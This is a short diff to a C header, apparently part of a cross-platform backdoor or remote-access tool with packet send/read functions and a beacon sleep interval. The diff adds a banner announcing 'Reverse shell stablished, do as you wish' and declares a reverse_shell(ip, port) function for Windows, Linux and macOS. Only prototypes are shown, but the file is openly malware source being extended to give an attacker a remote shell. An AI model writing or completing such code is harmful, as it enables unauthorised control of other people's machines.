@@ -32,6 +32,8 @@
 #include <unistd.h>
 #include <stdlib.h>
 #endif
+
+#define SHELL_MOTD " ┬┴┬┴┤/ᐠ｡‸｡ᐟ\\├┬┴┬┴ Reverse shell stablished, do as you wish\n"
 // This time is in seconds
 #define SLEEP_TIME 20
 
@@ -50,6 +52,12 @@ void send_packet(int fd, char *packet, size_t packet_size);
 int read_packet(int *fd, CHAR *buffer);
 #elif defined(__linux__) || defined(__APPLE__)
 int read_packet(int *fd, char *buffer);
+#endif
+
+#ifdef _WIN32
+void reverse_shell(CHAR *ip, int port);
+#elif defined(__linux__) || defined(__APPLE__)
+void reverse_shell(char *ip, int port);
 #endif
 
 #endif
